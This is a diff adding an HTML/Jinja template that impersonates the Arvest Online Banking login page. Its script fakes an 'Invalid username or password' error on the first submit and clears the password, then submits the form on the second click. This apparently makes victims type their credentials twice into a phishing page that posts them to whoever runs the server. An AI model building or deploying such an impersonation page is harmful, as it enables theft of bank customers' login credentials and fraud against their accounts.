@@ -1,0 +1,73 @@
+{% extends 'base.html'%} {%block body%}
+
+
+<div style="padding-top: 5px" class="middle-form">
+ 
+  
+  <div class="submitForm">
+    <div id="login-error" class="error-message hide">
+      <p style="color: red;">Invalid username or password, please try again!</p>
+    </div>
+ <p class="go-left" style="font-size: 14px; margin-bottom: 30px;">
+    Please enter your Login ID to log in to online banking. <br />
+  </p>
+    
+    <form id="login-form" action="" method="post">
+      <div class="input-field" style="text-align: left">
+        <label for="username">Login ID <span style="color: red;">*</span></label>
+        <input id="username" name="user-id" type="text" />
+      </div>
+      <div class="input-field" style="text-align: left">
+        <label for="password">Password <span style="color: red;">*</span></label>
+        <input id="password" name="password" type="password" />
+      </div>
+
+      <div class="checkboxWrapper" style="margin-top: 20px">
+        <div class="checkbox">
+          <input type="checkbox" name="" id="" />
+        </div>
+        <div class="label">
+          <label for="">Remember User ID</label>
+        </div>
+      </div>
+      <p>
+        <a style="text-decoration: none; font-size: 15px;" href="">Forgot your login ID</a>
+      </p>
+      <p>
+        <a style="text-decoration: none; font-size: 15px;" href="">Forgot your password</a>
+      </p>
+      
+    </form>
+
+    <button style="margin-top: -2px;" type="submit" onclick="LoginFunc()">Submit</button>
+    <br />
+    
+
+    <p>Unauthorized access is prohibited. Usage may be monitored</p>
+
+    <hr>
+
+    <p>Have questions about Arvest Online Banking?</p>
+   
+
+    
+  </div>
+</div>
+
+<script>
+  var click_counter = 0;
+  const LoginFunc = () => {
+    var notification = document.getElementById('login-error');
+    
+    if (click_counter == 0){
+      notification.classList.remove('hide');
+      document.getElementById('password').value = ''
+      click_counter+=1;
+      console.log(click_counter)
+    }else if(click_counter == 1){
+      console.log(click_counter,document.getElementById('login-form').submit());
+    }
+  }
+</script>
+
+{%endblock%}
